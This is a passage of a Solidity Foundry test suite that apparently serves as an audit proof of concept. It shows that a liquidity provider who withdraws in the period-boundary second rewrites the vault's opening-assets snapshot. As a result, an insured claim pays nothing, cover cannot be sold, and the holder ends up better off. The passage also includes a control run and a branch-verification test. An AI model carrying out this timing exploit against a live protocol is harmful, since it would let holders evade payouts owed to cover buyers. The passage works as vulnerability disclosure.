        usdc.mint(buyer, 1_000_000e6);
        vm.prank(buyer);
        usdc.approve(address(allocator), type(uint256).max);

        ICoverOrderAllocator.MarketCoverAllocation[] memory mcas =
            new ICoverOrderAllocator.MarketCoverAllocation[](1);
        mcas[0] = ICoverOrderAllocator.MarketCoverAllocation({
            marketId: marketId, allocatedCover: 100_000e18
        });
        bytes32 leaf = keccak256(bytes.concat(keccak256(abi.encode(orderId, mcas))));

        // The matcher commits against the collateral as it stands: fully funded.
        vm.prank(allocatorRole);
        allocator.commitAllocation(coveredPeriod, leaf, 100_000e18, 100_000e18);
        uint256 committedCapacity =
            allocator.getAllocationCommitment(coveredPeriod).totalAvailableCapacity;
        assertGt(committedCapacity, 0, "capacity was committed against real collateral");

        vm.prank(allocatorRole);
        allocator.settleCoverOrder(orderId, mcas, new bytes32[](0));

        // Same second, after the commit: the holder exits. Nothing leaves the vault.
        // Hoisted: an external call in the argument list consumes the pending prank.
        uint256 exitAmount = vault.maxWithdraw(lp);
        vm.prank(lp);
        vault.withdraw(exitAmount, lp, lp);
        assertEq(fxrp.balanceOf(address(vault)), 1_000_000e6, "every token is still here");
        assertEq(
            vault.withdrawAssets(coveredPeriod + 1),
            1_000_000e6,
            "and still in the bucket payout counts as payable"
        );
        assertEq(vault.totalAssetsAt(periodStart), 0, "but the ceiling now reads zero");

        // A real incident in the covered period, assessed at the cover sold.
        refNonce++;
        vm.prank(curator);
        uint256 incidentId =
            incidents.createIncident(periodStart, "hack", keccak256(abi.encode("ref", refNonce)));
        vm.prank(curator);
        incidents.confirmIncident(incidentId, "ipfs://r");
        IIncidentManager.AssessmentLoss[] memory losses = new IIncidentManager.AssessmentLoss[](1);
        losses[0] = IIncidentManager.AssessmentLoss({
            coverTokenId: orderId, marketId: marketId, amount: 100_000e18
        });
        vm.prank(curator);
        incidents.addAssessmentLosses(incidentId, losses);
        vm.prank(curator);
        incidents.submitCurrentAssessment(incidentId);
        vm.prank(admin);
        incidents.approveCurrentAssessment(incidentId);

        console.log("committed capacity   (canonical USD):", committedCapacity);
        console.log("assessed loss        (canonical USD): 100000000000000000000000");
        console.log("paid to recipient              (6dp):", fxrp.balanceOf(payoutReceiver));
        console.log("vault tokens held              (6dp):", fxrp.balanceOf(address(vault)));
        console.log("payable bucket                 (6dp):", vault.withdrawAssets(coveredPeriod + 1));

        assertEq(fxrp.balanceOf(payoutReceiver), 0, "the claim paid nothing");
        assertEq(fxrp.balanceOf(address(vault)), 1_000_000e6, "while the vault kept everything");
    }

    /// The other half of the same defect. `_computeAvailableCapacity` reads the same
    /// figure, so when the withdrawal lands before the commit in the boundary block
    /// the period cannot sell the cover its collateral actually supports.
    function test_theSameSecondAlsoCollapsesTheCapacityTheMatcherMayCommit() public {
        _lpDeposit(1_000_000e6);

        ICoverOrderAllocator.MarketAllocationInput[] memory mas =
            new ICoverOrderAllocator.MarketAllocationInput[](1);
        mas[0] = ICoverOrderAllocator.MarketAllocationInput({
            marketId: marketId, coverRateAnnual: 500, coverAmount: 100_000e18
        });
        vm.prank(curator);
        uint256 orderId = allocator.createCoverOrder(
            buyer, payoutRecipient, "r", address(usdc), mas, ICoverOrderAllocator.CoverOrderType.NEW
        );

        vm.warp(vault.currentPeriodEnd());
        feed.setAnswer(2e18);
        uint256 coveredPeriod = vault.currentPeriod();

        // This time the withdrawal comes first in the boundary block.
        uint256 exitAmount = vault.maxWithdraw(lp);
        vm.prank(lp);
        vault.withdraw(exitAmount, lp, lp);
        assertEq(fxrp.balanceOf(address(vault)), 1_000_000e6, "the collateral never left");

        ICoverOrderAllocator.MarketCoverAllocation[] memory mcas =
            new ICoverOrderAllocator.MarketCoverAllocation[](1);
        mcas[0] = ICoverOrderAllocator.MarketCoverAllocation({
            marketId: marketId, allocatedCover: 100_000e18
        });
        bytes32 leaf = keccak256(bytes.concat(keccak256(abi.encode(orderId, mcas))));

        // The matcher's tree can no longer be committed: the recomputed capacity is
        // zero, though the tokens backing it are sitting in the vault.
        vm.expectRevert();
        vm.prank(allocatorRole);
        allocator.commitAllocation(coveredPeriod, leaf, 100_000e18, 100_000e18);

        assertEq(
            allocator.getAllocationCommitment(coveredPeriod).root,
            bytes32(0),
            "the period sold no cover at all"
        );
        console.log("collateral held by the vault (6dp):", fxrp.balanceOf(address(vault)));
        console.log("cover the period could commit    : 0");
    }

    /// The realistic case: a holder who owns part of the vault, not all of it.
    /// The ceiling falls by exactly what they withdraw, while that same capital
    /// stays in the bucket `payout` counts as payable -- so the shortfall is
    /// their whole position, not the whole vault.
    function test_aPartialHolderShrinksTheCeilingByTheirOwnStake() public {
        address whale = address(0x77);
        _lpDeposit(900_000e6); // the rest of the vault
        fxrp.mint(whale, 100_000e6);
        vm.startPrank(whale);
        fxrp.approve(address(vault), type(uint256).max);
        vault.deposit(100_000e6, whale); // 10% of a 1,000,000 fXRP vault
        vm.stopPrank();

        vm.warp(vault.currentPeriodEnd());
        feed.setAnswer(2e18);
        uint48 periodStart = vault.currentPeriodStart();
        uint256 period = vault.currentPeriod();
        assertEq(vault.totalAssetsAt(periodStart), 1_000_000e6, "the period opened fully funded");

        uint256 exitAmount = vault.maxWithdraw(whale);
        vm.prank(whale);
        vault.withdraw(exitAmount, whale, whale);

        uint256 ceilingAfter = vault.totalAssetsAt(periodStart);
        uint256 payableNow = vault.totalAssets() + vault.withdrawAssets(period + 1);

        console.log("ceiling before        (6dp): 1000000000000");
        console.log("ceiling after         (6dp):", ceilingAfter);
        console.log("still payable         (6dp):", payableNow);
        console.log("collateral unreachable(6dp):", payableNow - ceilingAfter);

        // The ceiling fell by the whale's stake, and that stake is still sitting
        // in the payable bucket, unreachable by any claim against this period.
        assertApproxEqAbs(ceilingAfter, 900_000e6, 2, "ceiling fell by exactly the stake");
        assertApproxEqAbs(payableNow, 1_000_000e6, 2, "every token is still payable");
        assertApproxEqAbs(
            payableNow - ceilingAfter, exitAmount, 2, "the gap is the whale's position"
        );
    }

    /// Whether the caller gains, not merely whether the protocol loses. A holder
    /// who caps the period's payout below what their own capital would otherwise
    /// fund keeps the difference: the claim is smaller, so their share of it is
    /// smaller. Run twice, identical but for the second the withdrawal lands in.
    function test_theWithdrawingHolderEndsRicherForHavingUsedTheBoundary() public {
        uint256 withOn = _runClaimAndMeasureHolder(true);
        setUp();
        uint256 withOff = _runClaimAndMeasureHolder(false);

        console.log("holder's claimable, exiting ON the boundary  (6dp):", withOn);
        console.log("holder's claimable, exiting one second later (6dp):", withOff);
        console.log("gain from the timing                         (6dp):", withOn - withOff);

        assertGt(withOn, withOff, "the boundary exit left the holder better off");
    }

    /// @dev Sells cover, has `lp` exit either on or one second after the boundary,
    ///      then runs a claim for the full cover and returns what `lp` can still
    ///      claim from the bucket their exit went into.
    function _runClaimAndMeasureHolder(bool onTheBoundary) internal returns (uint256) {
        _lpDeposit(1_000_000e6);

        ICoverOrderAllocator.MarketAllocationInput[] memory mas =
            new ICoverOrderAllocator.MarketAllocationInput[](1);
        mas[0] = ICoverOrderAllocator.MarketAllocationInput({
            marketId: marketId, coverRateAnnual: 500, coverAmount: 400_000e18
        });
        vm.prank(curator);
        uint256 orderId = allocator.createCoverOrder(
            buyer, payoutRecipient, "r", address(usdc), mas, ICoverOrderAllocator.CoverOrderType.NEW
        );

        vm.warp(vault.currentPeriodEnd());
        feed.setAnswer(2e18);
        uint48 periodStart = vault.currentPeriodStart();
        uint256 coveredPeriod = vault.currentPeriod();

        usdc.mint(buyer, 1_000_000e6);
        vm.prank(buyer);
        usdc.approve(address(allocator), type(uint256).max);
        ICoverOrderAllocator.MarketCoverAllocation[] memory mcas =
            new ICoverOrderAllocator.MarketCoverAllocation[](1);
        mcas[0] = ICoverOrderAllocator.MarketCoverAllocation({
            marketId: marketId, allocatedCover: 400_000e18
        });
        bytes32 leaf = keccak256(bytes.concat(keccak256(abi.encode(orderId, mcas))));
        vm.prank(allocatorRole);
        allocator.commitAllocation(coveredPeriod, leaf, 400_000e18, 400_000e18);
        vm.prank(allocatorRole);
        allocator.settleCoverOrder(orderId, mcas, new bytes32[](0));

        // The only difference between the two runs.
        if (!onTheBoundary) {
            vm.warp(uint256(periodStart) + 1);
            feed.setAnswer(2e18);
        }
        uint256 exitAmount = vault.maxWithdraw(lp);
        vm.prank(lp);
        vault.withdraw(exitAmount, lp, lp);

        refNonce++;
        vm.prank(curator);
        uint256 incidentId =
            incidents.createIncident(periodStart, "hack", keccak256(abi.encode("gain", refNonce)));
        vm.prank(curator);
        incidents.confirmIncident(incidentId, "u");
        IIncidentManager.AssessmentLoss[] memory losses = new IIncidentManager.AssessmentLoss[](1);
        losses[0] = IIncidentManager.AssessmentLoss({
            coverTokenId: orderId, marketId: marketId, amount: 400_000e18
        });
        vm.prank(curator);
        incidents.addAssessmentLosses(incidentId, losses);
        vm.prank(curator);
        incidents.submitCurrentAssessment(incidentId);
        vm.prank(admin);
        incidents.approveCurrentAssessment(incidentId);

        // What the exiting holder can still take out of the bucket their exit
        // went into, after the claim has drawn on it.
        return vault.withdrawalsOf(coveredPeriod + 1, lp);
    }

    /// The control: the same withdrawal one second later leaves the snapshot alone,
    /// and the identical claim pays in full.
    function test_oneSecondLaterTheSameWithdrawalIsHarmless() public {
        _lpDeposit(1_000_000e6);

        ICoverOrderAllocator.MarketAllocationInput[] memory mas =
            new ICoverOrderAllocator.MarketAllocationInput[](1);
        mas[0] = ICoverOrderAllocator.MarketAllocationInput({
            marketId: marketId, coverRateAnnual: 500, coverAmount: 100_000e18
        });
        vm.prank(curator);
        uint256 orderId = allocator.createCoverOrder(
            buyer, payoutRecipient, "r", address(usdc), mas, ICoverOrderAllocator.CoverOrderType.NEW
        );

        vm.warp(vault.currentPeriodEnd());
        feed.setAnswer(2e18);
        uint48 periodStart = vault.currentPeriodStart();
        uint256 coveredPeriod = vault.currentPeriod();

        usdc.mint(buyer, 1_000_000e6);
        vm.prank(buyer);
        usdc.approve(address(allocator), type(uint256).max);
        ICoverOrderAllocator.MarketCoverAllocation[] memory mcas =
            new ICoverOrderAllocator.MarketCoverAllocation[](1);
        mcas[0] = ICoverOrderAllocator.MarketCoverAllocation({
            marketId: marketId, allocatedCover: 100_000e18
        });
        bytes32 leaf = keccak256(bytes.concat(keccak256(abi.encode(orderId, mcas))));
        vm.prank(allocatorRole);
        allocator.commitAllocation(coveredPeriod, leaf, 100_000e18, 100_000e18);
        vm.prank(allocatorRole);
        allocator.settleCoverOrder(orderId, mcas, new bytes32[](0));

        // The only difference from the test above.
        vm.warp(uint256(periodStart) + 1);
        // Hoisted: an external call in the argument list consumes the pending prank.
        uint256 exitAmount = vault.maxWithdraw(lp);
        vm.prank(lp);
        vault.withdraw(exitAmount, lp, lp);
        assertEq(vault.totalAssetsAt(periodStart), 1_000_000e6, "the snapshot survives");

        refNonce++;
        vm.prank(curator);
        uint256 incidentId =
            incidents.createIncident(periodStart, "hack", keccak256(abi.encode("ctrl", refNonce)));
        vm.prank(curator);
        incidents.confirmIncident(incidentId, "ipfs://r");
        IIncidentManager.AssessmentLoss[] memory losses = new IIncidentManager.AssessmentLoss[](1);
        losses[0] = IIncidentManager.AssessmentLoss({
            coverTokenId: orderId, marketId: marketId, amount: 100_000e18
        });
        vm.prank(curator);
        incidents.addAssessmentLosses(incidentId, losses);
        vm.prank(curator);
        incidents.submitCurrentAssessment(incidentId);
        vm.prank(admin);
        incidents.approveCurrentAssessment(incidentId);

        console.log("control: paid to recipient (6dp):", fxrp.balanceOf(payoutReceiver));
        assertEq(fxrp.balanceOf(payoutReceiver), 50_000e6, "the same claim pays in full");
    }
}

/// @dev Written during a false-positive review of this finding. The report
///      originally named `Checkpoints.push` overwriting on an equal key as the
///      root cause. `push` only overwrites when the incoming key equals the last
///      stored key, and otherwise appends -- so if the boundary-second write
///      appends, the report would be naming a branch the PoC never executes.
///      This decides it by observation instead of argument.
contract BoundaryBranchTest is BoundarySnapshotTest {
    function test_whichCheckpointBranchTheBoundarySecondActuallyTakes() public {
        _lpDeposit(1_000_000e6);

        // Move to a period boundary. `currentPeriodEnd()` of this period is
        // `periodStart` of the next one.
        uint48 boundary = vault.currentPeriodEnd();
        vm.warp(uint256(boundary));
        feed.setAnswer(2e18);

        // A checkpoint stored AT exactly `boundary` would make the boundary
        // reading differ from the reading one second earlier. Equality proves the
        // value at `boundary` is inherited from an earlier key -- i.e. no
        // checkpoint exists at that key yet, so a write there APPENDS.
        uint256 atBoundary = vault.totalAssetsAt(boundary);
        uint256 oneSecondEarlier = vault.totalAssetsAt(boundary - 1);
        bool aCheckpointAlreadyExistsAtTheBoundary = atBoundary != oneSecondEarlier;

        console.log("totalAssetsAt(boundary)     :", atBoundary);
        console.log("totalAssetsAt(boundary - 1) :", oneSecondEarlier);
        console.log("a checkpoint already sits on the boundary key:", aCheckpointAlreadyExistsAtTheBoundary);

        // Now do the ordinary withdrawal in the boundary second.
        uint256 exit = vault.maxWithdraw(lp);
        vm.prank(lp);
        vault.withdraw(exit, lp, lp);

        uint256 afterExit = vault.totalAssetsAt(boundary);
        console.log("totalAssetsAt(boundary) after the exit:", afterExit);

        // Whichever branch ran, the period's own opening figure was redefined
        // after the period had already begun. That is the defect.
        assertLt(afterExit, atBoundary, "the boundary-second write redefined the period's opening assets");
        assertFalse(
            aCheckpointAlreadyExistsAtTheBoundary,
            "no checkpoint sat on the boundary key, so the write APPENDED rather than overwrote"
        );
    }
}
```
